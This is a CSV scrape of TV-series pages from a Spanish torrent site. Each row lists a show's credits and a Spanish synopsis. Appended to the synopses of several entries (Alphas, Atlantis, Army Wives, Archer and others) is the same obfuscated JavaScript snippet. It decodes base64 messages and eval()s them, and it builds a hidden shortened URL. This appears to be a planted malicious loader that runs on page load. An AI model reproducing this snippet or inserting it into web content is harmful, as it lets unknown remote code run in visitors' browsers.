Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/american-horror-story/,American Horror Story,"
                       Título Original: American Horror Story
Creador: Ryan Murphy y Brad Falchuk
Producción Ejecutiva: Dante Di Loreto, Brad Falchuk y Ryan Murphy
Estudio: 20th Century Fox Television
Género: Terror
Temporadas: 2ª
Episodios: 13
Lugar de rodaje: Los Angeles
Sintonía: American Horror Story Theme - Charlie Clouser
Distribución: Fox
Audiencia temp. pasada: 2,81 millones de espectadores
Horario de emisión: Miércoles 10.00 p.m.

Reparto:
Dylan McDermott ... Ben Harmon
Connie Britton ... Vivien Harmon
Evan Peters ... Tate Langdon
Taissa Farmiga ... Violet Harmon
Denis O'Hare ... Larry Harvey
Jessica Lange ... Constance
Frances Conroy ... Moira
Alex Breckenridge ... Moira
Jamie Brewer ... Addy						","
Descripcion
American Horror Story es una apasionante serie que nos presenta a los Harmon, quien a primera vista son una familia perfecta. Pero las apariencias pueden ser engañosas. Después de haber sufrido un brutal aborto espontáneo y un episodio de infidelidad conyugal, un matrimonio y su hija adolescente deciden mudarse de Boston a Los Angeles, en un intento por dejar atrás los recuerdos del pasado. Sin embargo, aunque su nueva propiedad inicialmente parece ser la casa ideal, se trata de una mansión encantada que alberga un gran número de oscuros secretos que cambiarán la vida de los Harmon para siempre.
Ben Harmon (Dylan McDermott, El abogado) es un sensible psiquiatra que tiene problemas para entender a su propia familia. Se esfuerza por mantenerse fiel a su esposa, pero después del aborto que sufrió ella, mantuvo una aventura con una de sus estudiantes. Es un esfuerzo por no perder a su familia, acepta mudarse al otro lado del país para empezar de nuevo. Pero su pasado seguirá atormentándolo… igual que su nueva casa. La atractiva esposa de Ben, Vivien (Connie Britton, Friday Night Lights) fue quien descubrió a su marido en plena infidelidad. Aunque ahora pelea por superar su bajo líbido, le rodea un halo de seducción y algo en su nuevo hogar le despierta la curiosidad.
"
https://www.subtorrents1.com/series/animals/,Animals,"
                       AÑO DE PRODUCCIÓN: 2017

GÉNERO: COMEDIA/

DURACIÓN: 25

CENSURA: C						","
Descripcion
La peculiar e irreverente comedia regresa con las historias de amor, amistad y problemas existenciales que viven los animales con pensamientos humanos en las calles de Nueva York. En esta temporada, moscas, cucarachas, palomas, ardillas y gatos se enfrentan a distintas situaciones dentro de una agitada sociedad.
"
https://www.subtorrents1.com/series/1-contra-todos/,1 Contra Todos,"
                       Creado por Breno Silveira (2015)
Con Júlio Andrade, Julia Lanina, Adriano Garib más
País Brasil
Idioma: Portugues
Género Drama
Estado en curso
Duración 60 minutos						","
Descripcion
Cadu (Julio Andrade) es un abogado dedicado que aprecia por la verdad y la justicia por encima de todo. Con una esposa embarazada de su segundo hijo y recientemente desempleado, ve su vida cambiar completamente cuando es acusado y condenado a la prisión tras ser confundido con el mayor traficante de drogas de Brasil. En la cadena, Cadu adopta una nueva postura para poder sobrevivir y decide comportarse como el criminal que todos ya creen que es. Sin embargo, además de coleccionar enemigos, su decisión afecta drásticamente las vidas de las personas que él ama.
"
https://www.subtorrents1.com/series/alphas/,Alphas,"
                       Título Original: Alphas
Creador: Michael Karnow y Zak Penn
Producción Ejecutiva: Gail Berman, Gene Stein, Ira Steven Behr, Jack Bender, Lloyd Braun y Zak Penn
Estudio: Universal Cable Productions
Género: Ciencia Ficción
Temporada: 2ª
Episodios: 13
Fecha de estreno: 11 de julio de 2011
Lugar de rodaje: Toronto
Audiencia temp. pasada: 1,96 millones de espectadores
Horario de emisión Lunes 10.00 p.m.

Reparto:
David Strathairn ... Lee Rosen
Laura Mennell ... Nina Theroux
Malik Yoba ... Bill Harken
Ryan Cartwright ... Gary Bell
Warren Christie ... Christian Hicks
Azita Ghanizada ... Rachel Myers						","
Descripcion
SyFy entra en el mundo de los superhéroes con Alphas, una serie que sigue a un equipo de ciudadanos normales cuyas anomalías cerebrales les proporcionan extraordinarias habilidades mentales y físicas. Tomando la ley con sus propias manos, esta unidad liderada por el doctor Lee Rosen, investiga casos que sugieren actividad de otros Alfas y que la CIA, el FBI o el Pentágono no son capaces, o no están dispuestos a resolver. Mientras trabajan contrarreloj para investigar esta nueva oleada criminal, estos dotados individuos deben equilibrar sus extravagantes personalidades y sus diferentes orígenes con sus no siempre visibles poderes, con el objetivo de resolver crímenes, evitar atentados, capturar a los enemigos y salvar el mundo.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/12-monkeys/,12 Monkeys,"
                       Título original: 12 Monkeys
Año: 2015
País: Estados Unidos
Director: Jeffrey Reiner, David Grossman, Michael Waxman, John Badham, David Boyd
Guión: Travis Fickett, Terry Matalas, Rebecca Kirsch
Música: Paul Linford, Trevor Rabin
Fotografía: Todd McMullen, Tico Poulakakis
Género: Drama, Ciencia ficción

Capítulos: 13


Reparto:

Aaron Stanford ... James Cole
Amanda Schull ... Cassandra Railly
Bill Timoney ... Senator Royce
Kirk Acevedo ... Ramse
Noah Bean ... Aaron Marker
Ramon De Ocampo ... Oliver Peters
Ricky Wayne ... Brian Swinsburg
Robert Wisdom ... Jeremy
Shannon Lucio ... Jennifer
Zeljko Ivanek ... Leland Frost						","
Descripcion
'12 Monkeys' se centra en en Cole, un hombre desesperado que viaja en el tiempo desde el presente apocalíptico que aparece en nuestros días a una misión para localizar y erradicar la fuente de una plaga mortal que eventualmente diezmará a la raza humana.
 
"
https://www.subtorrents1.com/series/american-playboy-the-hugh-hefner-story/,American Playboy The Hugh Hefner Story,"
                       Título original
    American Playboy: The Hugh Hefner Story (TV Series) 
Año
    2017
Duración
    42 min.
País
    Estados Unidos Estados Unidos
Director
    Richard Lopez 
Guion
    Brian Burstein, Stephen David, Tim W. Kelly, Jeremiah Murphy, Peter Sherman
Fotografía
    Milton Kam
Reparto
    Documentary, Matt Whelan, Emmett Skilton, Adam Jonas Segaller, Ian Bell, Chelsie Preston Crayford, Victoria Abbott, Matt Arbuckle, Ella Becroft, Rowan Bettjeman, Fraser Brown, Alistair Browning, Joy Buckle, Shara Connolly, Campbell Cooley, Elizabeth Dowden, Coen Falke 
Productora
    Alta Loma Entertainment / Stephen David Entertainment. Distribuída por Amazon Studios
Género
    Serie de TV. Documental. Drama | Biográfico 						","
Descripcion
American Playboy: The Hugh Hefner Story está ambientada en la época de posguerra en Estados Unidos, concretamente en 1953, año en que se lanza al mercado la revista Playboy. La serie narra la historia su creador, Hugh Hefner, y la evolución de esta publicación a lo largo de 60 años. Mientras Hefner creaba esta controvertida revista, se convirtió en un defensor de la justicia social, hecho que le puso en el punto de mira del movimiento conservador. Casi sin darse cuenta, Hefner pasó a ser un gran defensor de los derechos civiles, la libertad de expresión, los derechos de los homosexuales y la libertad sexual.
La historia de Hugh Hefner está contada con las propias palabras de quien vivió esa historia, ya que Hefner, a sus 90 años de edad, ha participado en el desarrollo, la producción y el guion de esta serie que está protagonizada por Matt Whelan (Go Girls) en el papel de Hugh Hefner, Ian Bell (The Making of the Mob: New York) es Art Paul, Adam Jonas Segaller (NASCAR: The Rise of Ame) es A.C. Spectorsky y Emmett Skilton (The Almighty Johnsons) da vida a Victor Lownes.
La ficción original de Amazon está producida por Stephen David  Entertainment (Sons of Liberty) y productora de Playboy Enterprises: Alta Loma Entertainment. Richard Lopez (I Sell the Dead) es el director de esta serie que cuenta con un equipo de guionistas formado por Jeremiah Murphy, Peter Sherman y Brian Burstein. Los productores ejecutivos son el propio David, Peter Jaysen, Dick Rosenzweig, Shirley Escott y Tim Kelly. 
"
https://www.subtorrents1.com/series/2-broke-girls/,2 Broke Girls,"
                       TÍTULO ORIGINAL: 2 Broke Girls
AÑO: 2011 	
DURACIÓN: 20 min. 
PAÍS: Estados Unidos
DIRECTOR: Whitney Cummings (Creator), Michael Patrick King (Creator), James Burrows
GUIÓN: Whitney Cummings, Michael Patrick King
FOTOGRAFÍA: Gary Howard Baum
PRODUCTORA: Emitida por la cadena CBS; CBS Television Network
GÉNERO: Comedia

REPARTO: 	
Kat Dennings, Beth Behrs, Noah Mills, Garrett Morris, Brooke Lyons, Matthew Moy, Jonathan Kite, Bill Parks, Adam Korson						","
Descripcion
Caroline, una joven rica que pasa una mala racha empieza a trabajar en el restaurante en el que Max es camarera. Las dos jóvenes, muy diferentes entre sí, empezarán a compartir piso a la vez que forjan su sueño de montar su propio restaurante con el que hacerse ricas, para lo cual antes necesitarán conseguir dinero para hacerlo realidad.
 
"
https://www.subtorrents1.com/series/american-crime/,American Crime Temporada 3 FINAL TEMPORADA,"
                       Título original: American Crime
Año: 2015
País: Estados Unidos
Director: John Ridley (Creator)
Guión: John Ridley, Davy Perez, Julie Hébert
Música: Mark Isham
Fotografía: Ramsey Nickell
Productora: ABC Studios
Género: Drama, Drama judicial, Racismo

Capítulos: 11


Reparto:

Timothy Hutton ... Chuck Skokie
Felicity Huffman ... Barb Skokie
Benito Martinez ... Alonzo Gutierrez
Brent Anderson ... Detective Palmer
Caitlin Gerard ... Aubry Taylor
Elvis O. Nolasco ... Carter Nix
Johnny Ortiz ... Tony Gutierrez
Penelope Ann Miller ... Eve Harmon
Richard Cabral ... Hector Tontz
W. Earl Brown ... Tom Harmon						","
Descripcion
Tras el asalto a la casa de Matt Skokie que dejó a su mujer Gwen en coma, cuatros sospechosos son detenidos, y las vidas de los participantes del posterior juicio, lleno de connotaciones raciales, cambiarán para siempre durante el proceso legal. Serie creada por John Ridley, ganador de un Oscar por el guión de ""12 años de esclavitud"".
"
https://www.subtorrents1.com/series/a-touch-of-cloth-miniserie/,A Touch of Cloth (Miniserie),"
                       Título original: A Touch of Cloth
Año: 2012
Duración: 90 min.
País: Reino Unido
Director: Jim O'Hanlon
Guión: Charlie Brooker, Daniel Maier (Historia: Boris Starling)
Música: Dru Masters, Peter Holmes
Fotografía: Len Gowing

Reparto:
John Hannah,  
Suranne Jones,  
Julian Rhind-Tutt,  
Adrian Bower,  
Navin Chowdhry,  
Raquel Cassidy,  
Daisy Beaumont,  
Theo Barklem-Biggs, 
Kate Fleetwood,  
Geoff McGivern,  
Brian Peck,  
Brian Cox

Productora: Emitido por Sky1; Zeppotron
Género: Comedia. Thriller | Policíaco. Asesinos en serie. Parodia.						","
Descripcion
Una nueva sátira del creador de ""Dead Set"" y ""Black Mirror"" Charlie Brooker, una parodia de los procedimentales policíacos. Jack Cloth es un policía bebedor y solitario que se ha refugiado en su trabajo tras la misteriosa muerte de su mujer. Anne Oldman es su severa y ambiciosa compañera lesbiana. Juntos avanzan entre sórdidos asesinatos, forenses cínicas, traumas personales, tensiones sexuales sin resolver, persecuciones acrobáticas por barrios bajos y jefes amargados que piden resultados antes de 24 horas. Como hacen todos los detectives.
Miniserie:
Temporada: 1
Capítulos: 2
Temporada: 2
Capítulos: 2
Temporada: 3
Capítulos: 2
(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/atlantis/,Atlantis,"
                       Título original: Atlantis
Año: 2013
Duración: 45 min.
País Reino: Unido
Director: Howard Overman (Creator),  Alice Troughton,  Justin Molotnikov
Guión: Howard Overman
Productora: Urban Myth Films / BBC One
Género: Aventuras. Fantástico 
Temporada: 1
Capítulos: 13
Reparto:
Robert Emms,  
Mark Addy,  
Juliet Stevenson,  
Sarah Parish,  
Jack Donnelly,  
Jemima Rooper,  
Oliver Walker
","
Descripcion
Cuando Jason comienza a buscar a su padre, él nunca podría haber previsto a donde le llevaría su viaje… Lejos de casa y desesperados en busca de respuestas, Jason se lava en la orilla de una tierra antigua. Un lugar misterioso, un mundo donde el toro salta, de diosas con pelo de serpiente y palacios tan grandes que se dijo que fueron construidoss por gigantes – esta es la ciudad de la Atlantis. Pero bajo la superficie de este lugar atractivo se oculta un pasado oscuro que se cuece a fuego lento, una complicada red de la traición y de engaño, con la que el propio Jason parece inexplicablemente ligado.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/army-wives/,Army Wives,"
                       Título Original: Army Wives
Creador: Katherine Fugate
Producción Ejecutiva: Katherine Fugate, Deborah Spera, Jeff Melvoin y Mark Gordon
Estudio: ABC Television Studio
Género: Drama
Temporada: 6ª
Episodios: 14
Lugar de rodaje: Charleston (Carolina del Sur)
Distribución: Buenavista
Audiencia temp. pasada: 3,45 millones de espectadores
Horario de emisión: Domingos 10.00 p.m.

Reparto:
Catherine Bell Denise Sherwood
Brigid Brannagh Pamela Moran
Kim Delaney Claudia Joy Holden
Brian McNamara Michael Holden
Sterling K. Brown Roland Burton
Wendy Davis Joan Burton
Drew Fuller Trevor LeBlanc
Sally Pressman Roxy LeBlanc
Jeremy Davidson Chase Moran
Terry Serpico Frank Sherwood
Rhoda Griffis Lenore Baker
","
Descripcion
De manos de The Mark Gordon Company y ABC Television Studios llega Army Wives, una nueva serie sobre los problemas, los sueños y las amistades de un diverso grupo de mujeres — y un hombre– que viven con sus esposos y familias en una activa base militar, y que sufren las presiones y tradiciones que impone la vida en el ejército en las personas que se quedan en casa, mientras sus allegados sirven a su país.
La vida de esposa de un militar nunca es aburrida, especialmente la de las protagonistas de esta serie. Se enfrentarán a todo tipo de retos y desafíos tratando de encajar en el mundo militar, intentando mantener el contacto con sus seres queridos en el frente, y soportando las estrictas tradiciones militares, lo que las llevará a formar una insólita alianza para ayudarse entre ellas a pasar por las situaciones más inimaginables y proteger sus secretos más oscuros.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/alamaailma-trilogia-vanki/,Alamaailma Trilogia: Vanki,"
                       Título original
    Alamaailma Trilogia: Vanki 
Año
    2010
Duración
    292 min.
País
    Finlandia Finlandia
Dirección
    Minna Virtanen 
Guion
    Marko Leino
Música
    Lauri Porra
Reparto
    Martti Suosalo, Mikko Kouki, Eppu Salminen, Krista Kosonen, Max Ovaska, Miia Nuutila, Timo Tuominen, Ville Haapasalo, Alexander Diachenko, Ivan Mathias Petersson, Sari Siikander 
Productora
    Vertigo Production
Género
    Drama | Miniserie de TV. Crimen 						","
Descripcion
Alamaailma Trilogía, relata el tráfico de drogas y el lavado de dinero en Helsinki, Estocolmo y San Petersburgo. En este mundo, Finlandia tiene una posición interesante, ya que es el último puesto fronterizo entre el Este y el Oeste. En esta serie de 12 capítulos, los tres están entrelazados entre sí, pero al mismo tiempo, cada uno implica una historia independiente, que se abre de forma gradual a través de las fronteras en el mundo duro y realista criminal.
Vesa Levola es un joven decente con una carrera prometedora que inesperadamente termina en la cárcel después de involucrarse en una pelea callejera. En la cárcel, Vesa termina trabajando para el capo del mundo criminal, que dirige una organización de tráfico de drogas detrás de las rejas.
"
https://www.subtorrents1.com/series/alta-mar/,Alta Mar,"
                       Título original
Alta mar (TV Series)
Año
2019
Duración
40 min.
País
España España
Dirección
Ramón Campos (Creator),  Gema R. Neira (Creator),  Lino Escalera,  Carlos Sedes
Guion
Ramón Campos, Gema R. Neira, Daniel Martín Serrano, Curro Novallas, José Antonio Valverde
Fotografía
Jacobo Martínez
Reparto
Jon Kortajarena,  Ángela Molina,  Eloy Azorín,  Félix Gómez,  José Sacristán, Tamar Novas,  Alejandra Onieva,  Ivana Baquero
Productora
Bambú Producciones / Netflix España. Distribuida por Netflix
Género
Serie de TV. Drama. Intriga | Aventuras marinas. Años 40
Web oficial
https://www.netflix.com/title/80233258						","
Descripcion
8 episodios. Ambientada en un enorme transatlántico lleno de pasajeros que viajan de Europa a América en busca de un futuro mejor. Entre el pasaje y tripulación están dos hermanas, Carolina (Alejandra Onieva) y Eva (Ivana Baquero), tan distintas como inseparables; un apuesto oficial, Nicolás Salas (Jon Kortajarena), al que el destino ha ubicado en el lugar equivocado; y un misterio por resolver: el asesinato de una pasajera cuyo nombre no aparece en la lista de abordo, y a la que nadie recuerda. Amores, intrigas y muchas mentiras en un barco que esconde, en cada camarote, una historia y, en el fondo, un oscuro secreto. Solo una cosa está clara: estando en alta mar, el asesino no podrá salir del barco.
"
https://www.subtorrents1.com/series/atlantis-end-of-a-world-birth-of-a-legend/,Atlantis: End Of A World Birth Of A Legend,"
","
Descripcion
Serie de Tv drama el mayor desastre que haya sacudido al mundo antiguo la destruccion de la isla de thera ( Hoy a nuestros dias la isla de Santorini ) en el año 1620 antes de cristo
Muchos expertos ahora creen que esta erupcion volcanica y el impacto de esta catastrofe en la primera gran civilizacion de Europa Los Minoans Inspirado en la leyenda de Atlantis(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/24-legacy/,24: Legacy,"
                       Título original: 24: Legacy
Año: 2017
País: Estados Unidos
Director: Robert Cochran (Creator), Joel Surnow (Creator), Stephen Hopkins
Guion: Robert Cochran, Manny Coto, Howard Gordon, Evan Katz, Joel Surnow
Música: Sean Callery
Fotografía: Jeffrey C. Mygatt, Peter Levy
Productora: 20th Century Fox Television / Fox / Imagine Television
Género: Acción. Drama. Suspenso

Capítulos: 12


Reparto:

Corey Hawkins ... Eric Carter
Miranda Otto ... Rebecca Ingram
Teddy Sears ... Keith Mullins
Ashley Thomas ... Isaac Carter
Dan Bucatinsky ... Andy Shalowitz
Charlie Hofheimer ... Ben Grimes
Sheila Vand ... Nilaa Mizrani
Jimmy Smits ... John Donovan						","
Descripcion
Eric Carter, un veterano de guerra con un duro pasado que regresa a casa, a los brazos de su esposa Nicole, y debe trabajar uniendo fuerzas con con el CTU (Unidad Contra Terrorista), poniéndose bajo las órdenes de Rebecca Ingram, una antigua jefa del CTU, casada con un senador de nombre John Donovan. 
24: Legacy es una nueva entrega dentro de la franquicia creada a partir de la serie de televisión protagonizada por Kiefer Sutherland en el papel del mítico agente federal Jack Bauer. Esta nueva serie está protagonzada por Corey Hawkins (Straight Outta Compton) y la actriz australiana Miranda Otto (Eowyn en la trilogía de El Señor de los Anillos). La producción de Fox mantiene el mismo formato de tiempo real que su predecesora y cuenta con 12 episodios para cubrir los eventos que suceden en un solo día. 
Evan Katz y Manny Coto escriben y producen este spin-off, en el que están acompañados por los productores ejecutivos Howard Gordon y Brian Grazer.
"
https://www.subtorrents1.com/series/avengers-assemble/,Avengers Assemble,"
                       Título original: Avengers Assemble
Año: 2013
País: Estados Unidos
Fotografía: Animation
Reparto: Animation
Productora: Marvel Entertainment
Género: Animación. Fantástico. Ciencia ficción | Superhéroes. Cómic. Marvel Comics 
Temporada: 1
Capítulos: 26						","
Descripcion
Nueva serie de Marvel Animation Studios,que aparecerá para sustituir a la actual serie del grupo ""Los heroes mas poderosos de la tierra"" ,con una alineación acorde a la aparecida en la película y que sólo tendrá la incorporación de un nuevo heroe,""El Halcón"".(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/appropriate-adult/,Appropriate Adult,"
","
Descripcion
Fred West, que fue acusado de asesinar a por lo menos 12 mujeres jovenes, y enterrar a muchos de sus restos en su casa de Gloucester, Inglaterra entre 1967 y 1987, con ayuda de su esposa Rosemary, quien actualmente cumple una sentencia de cadena perpetua por su participación en los crímenes horribles.
El reinado de terror de los West llegó a su fin después de que ellos asesinaran a su propia hija, Heather.
Fred West se ahorcó en su celda en 1995 de la prisión de Winson Green mientras esperaba el juicio por varios asesinatos.
La serie que narrará la vida del asesino desde su detención hasta su muerte será transmitido en el canal británico ITV. La nominada al Oscar, Emily Watson será Janet Leach, quien se sentó en las entrevistas de la policía, mientras que la actriz Monica Dolan hará el papel de Rosemary West.
(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/animal-kingdom/,Animal Kingdom,"
                       Título original: Animal Kingdom
Año: 2016
País: Estados Unidos
Director: John Wells
Guión: Jonathan Lisco
Fotografía: Daniel Moder
Género: Drama, Crimen
Productora: TNT

Capítulos: 10


Reparto:

Ellen Barkin ... Janine 'Smurf' Cody
Ben Robson ... Craig Cody
Shawn Hatosy ... Andrew 'Pope' Cody
Scott Speedman ... Barry 'Baz' Brown
Jake Weary ... Deran Cody
Molly Gordon ... Nicky
Daniella Alonso ... Catherine						","
Descripcion
La serie se centra en Joshua de 17 años, que se muda con sus parientes, abuela y tíos, a una ciudad costera del sur de California después de que su madre muere de una sobredosis de heroína. Entre la indulgencia y el exceso, pronto descubre que son un clan, y que la vida está siendo financiada por actividades criminales.
Está basada en la película del 2010 que lleva su mismo nombre, de David Michôd que es productor ejecutivo de la serie.
"
https://www.subtorrents1.com/series/archer/,Archer,"
                       TÍTULO ORIGINAL: Archer
AÑO: 2009 	
PAÍS: Estados Unidos
DIRECTOR: Adam Reed (Creator)
GUIÓN: Adam Reed
MÚSICA: Michael Kohler
FOTOGRAFÍA: Animation
REPARTO: Animation
PRODUCTORA: FX Network / Floyd County Productions
GÉNERO: Serie de TV. Animación. Intriga | Espionaje. Parodia. Animación para adultos
SINOPSIS 	Serie de TV (2009-Actualidad). 10 episodios. Parodia animada de las películas y series sobre espías. 						","
Descripcion
SINOPSIS:
Serie de TV (2009-Actualidad). 10 episodios. Parodia animada de las películas y series sobre espías. (function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/alex/,Alex,"
                       País: Suecia.
Título internacional: Alex.
Género: Acción, Thriller.
Capítulos: 6

Elenco:
- Malin Arvidsson (Sheila Stensson)
- Shadi Bahsoun (Salaam)
- Anna Bjelkerud (Ragnhild Björkfors)
- Erik Bolin (Ivan Johansson)
- Gizem Erdogan (Samira)
- Eric Ericson (Martin Stensson)

Creador: Manuel Concha, Alain Darborg.
Guión: Gunnar Järvstad, Niclas Rockström, Vanja Torp, Frans Wiklund.						","
Descripcion
Un duro y corrupto policía decide dejar atrás el bajo mundo en el que se mueve. Sin embargo, sus conexiones más oscuras siguen tirando de él y pronto se encontrará a sí mismo y su familia en gran peligro…
"
https://www.subtorrents1.com/series/bad-guy/,Bad Guy,"
                       Título original
    Nappeun Nyeoseokdeul (TV Series)
Año
    2014
Duración
    60 min.
País
    Corea del Sur Corea del Sur
Dirección
    Jung-min Kim 
Guion
    Jung-hoon Han
Reparto
    Dong-seok Ma, Hae-Jin Park, Ye-won Kang, Sang Jung Kim, Dong-Hyuk Cho, Shin-il Kang, Hyo-jun Park, Byeong-chun Kim, Hye-Yoon Kim, Tae-hoon Kim, Seong-Eon Lim, Jia Min, Jung-Hak Park, Seung-eon Hwang, Min Kwon, Choe Min 
Género
    Serie de TV. Thriller | Venganza. Asesinos en serie. Crimen 						","
Descripcion
Un inspector de policía pide la puesta en libertad de tres peligrosos reclusos para que se unan a la lucha contra el crimen.
"
https://www.subtorrents1.com/series/a-passionate-woman-miniserie/,A Passionate Woman (Miniserie),"
                       Título original: A Passionate Woman
Año: 2010
Duración: 90 min.
País: Reino Unido
Director: Antonia Bird,  Kay Mellor
Guión: Kay Mellor 
Música: Mark Bradshaw
Fotografía: Tony Coldwell
Productora: Rollem Productions / Screen Yorkshire / British Broadcasting Corporation (BBC)Género: Drama | Años 50. Años 80. 
Temporada: Miniserie
Capítulos: 2

Reparto: 
Theo James,  
Sue Johnston,  
Billie Piper,  
Kelly Harrison,  
Alun Armstrong,  
Marie Critchley,  
Andrew Lee Potts,  
Anthony Lewis,  
Frances Barber,  
Anna Skellern,  
Wendy Patterson,  
Barbara Marten,  
Allan Corduner

","
Descripcion
La primera parte se centra en el affair de una madre con su vecino en la década de los años 50, y la segunda parte sitúa su acción en los 80 y en las consecuencias que tuvo aquél romance y en cómo ha cambiado el papel de la mujer durante las últimas décadas. (function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/axe-cop/,Axe Cop,"
                       Axe Cop
Classification: Animation
Genre: Animation General | Comedy | Crime | Drama | Family
Status: New Series
Network: FOX ( USA)
Airs: Saturdays at 11:00 pm
Runtime: 15 Minutes
Premiere: July 21, 2013
Episode Order: 6						","
Descripcion
Todo buen connoisseur de webcómics sabe de Axe Cop, la épica historieta de los hermanos Nicolle. Si aún no la conoces, te estás perdiendo de una de las tiras más alocadas que existen en la web. Tanto, que la Fox anunció hace seis meses que tomaría al personaje y le daría su propia serie animada, la cual introduciría en un bloque de programación para adultos que compita con Adult Swim de Cartoon Network.
Si les ha parecido un tanto absurdo, ¡ése es el punto! Axe Cop es una historieta escrita por un chico de ocho años (Malachai Nicolle, quien tenía cinco cuando empezó el cómic) y dibujada por su hermano mayor de 31, Ethan. Después de muchas críticas positivas en la red, Ethan consiguió que la editorial Dark Horse publicara el cómic en formato impreso. De ahí, llamó la atención de Nick Weidenfeld, quien intentó (sin éxito) obtener los derechos para Adult Swim.
"
